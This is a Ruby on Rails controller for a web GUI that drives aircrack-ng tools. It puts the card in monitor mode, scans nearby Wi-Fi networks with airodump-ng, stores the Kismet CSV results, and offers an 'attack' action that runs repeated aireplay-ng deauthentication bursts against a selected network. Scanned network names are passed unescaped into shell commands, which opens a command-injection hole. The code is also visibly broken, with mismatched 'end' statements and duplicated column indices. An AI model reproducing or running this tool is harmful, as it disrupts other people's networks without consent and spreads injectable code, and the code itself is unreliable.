class NetworksController < ApplicationController
      require 'csv'
      require 'open3'


  def index
    @Date = `date`
    @Hostname = `hostname`
    @User = `whoami`
    @NetworkInf = `iwconfig`
    @airmonstat = `airmon-ng`
    @airmoncheck = `airmon-ng check`
    @airmonkill = `airmon-ng check kill`
    @airmonstart = `airmon-ng start wlan0`
  end

  def test
    @iwconfig = `iwconfig`
  end

  def load

    #Networks_text = CSV.read("#{Rails.root}/public/seed.kismet-01.kismet.csv")
    @Networks_text = File.read("#{Rails.root}/public/seed.kismet-*.kismet.csv", encoding: 'ISO-8859-1:UTF-8')
    @Networks_text_to_csv = @Networks_text.tr("\r", '')

    CSV.parse(@Networks_text_to_csv, :col_sep => ";") do |row|


        #CSV.foreach("#{Rails.root}/public/seed.kismet-01.kismet.csv", :col_sep => (";")) do |row|


          #csv  Network.create({bssid: row[0], First_time_seen: row[1], Last_time_seen: row[2],channel: row[3], Speed: row[4],Privacy: row[5], Cipher: row[6], Authentication: row[7], Power: row[8], beacons: row[9], IV: row[10], LAN_IP: row[11], ID_lenght: row[12], ESSID: row[13], Key: row[14],})
          # kismet
          Network.create({
            Network: row[0], NetType: row[1], ESSID: row[2], BSSID: row[3],
            Info: row[4], Channel: row[5], Cloaked: row[6], Encryption: row[7],
            Decrypted: row[8], MaxRate: row[9], MaxSeenRate: row[10],
            Beacon: row[11], LLC: row[12], Data: row[13], Crypt: row[14],
            Weak: row[15], Total: row[16], Carrier: row[17], Encoding: row[18],
            FirstTime: row[19], LastTime: row[20], BestQuality: row[21],
            BestSignal: row[22], BestNoise: row[23], GPSMinLat: row[23],
            GPSMinLon: row[24], GPSMinAlt: row[25], GPSMinSpd: row[26],
            GPSMaxLat: row[27], GPSMaxLon: row[28], GPSMaxAlt: row[29],
            GPSMaxSpd: row[30], GPSBestLat: row[31], GPSBestLon: row[32],
            GPSBestAlt: row[33], DataSize: row[34], IPType: row[35],
            IP: row[36],
            })

    end
  end

  def scan
    @NetworkInf = `iwconfig`
    #@Networks_scan = `timeout 20 airodump-ng -w /root/GUIfi/public/seed.kismet --output-format kismet --write-interval 1 wlan0mon`
    #system ('timeout 20 airodump-ng -w /root/GUIfi/public/seed.kismet --output-format kismet --write-interval 1 wlan0mon')
    system ('./scan.sh')
    #system ("bash -c 'timeout 20 xterm airodump-ng -w /root/GUIfi/public/seed.kismet --output-format kismet --write-interval 1 wlan0mon')


    @Networks_text = File.read("#{Rails.root}/public/seed.kismet-01.kismet.csv", encoding: 'ISO-8859-1:UTF-8')
    @Networks_text_to_csv = @Networks_text.tr("\r", '')

    CSV.parse(@Networks_text_to_csv, :col_sep => ";") do |row|

          Network.create({
            Network: row[0], NetType: row[1], ESSID: row[2], BSSID: row[3],
            Info: row[4], Channel: row[5], Cloaked: row[6], Encryption: row[7],
            Decrypted: row[8], MaxRate: row[9], MaxSeenRate: row[10],
            Beacon: row[11], LLC: row[12], Data: row[13], Crypt: row[14],
            Weak: row[15], Total: row[16], Carrier: row[17], Encoding: row[18],
            FirstTime: row[19], LastTime: row[20], BestQuality: row[21],
            BestSignal: row[22], BestNoise: row[23], GPSMinLat: row[23],
            GPSMinLon: row[24], GPSMinAlt: row[25], GPSMinSpd: row[26],
            GPSMaxLat: row[27], GPSMaxLon: row[28], GPSMaxAlt: row[29],
            GPSMaxSpd: row[30], GPSBestLat: row[31], GPSBestLon: row[32],
            GPSBestAlt: row[33], DataSize: row[34], IPType: row[35],
            IP: row[36],
            })

    end

end

  def update

  end

  def show
    @Networks = Network.all
  end

  def attack
    @Network_attack = Network.find(params[:id])
      @killall = `airmon-ng stop wlan0mon`
      @NetworkInf = `iwconfig`
      @airmonstart = `airmon-ng start wlan0 #{@Network_attack.Channel}`
      @airreplayng = `aireplay-ng -0 20 -a #{@Network_attack.BSSID} wlan0mon -e #{@Network_attack.ESSID} `
    end
  end

  def locate

  end

  def kill
    @killall = `airmon-ng stop wlan0mon`
    @NetworkInf = `iwconfig`
  end
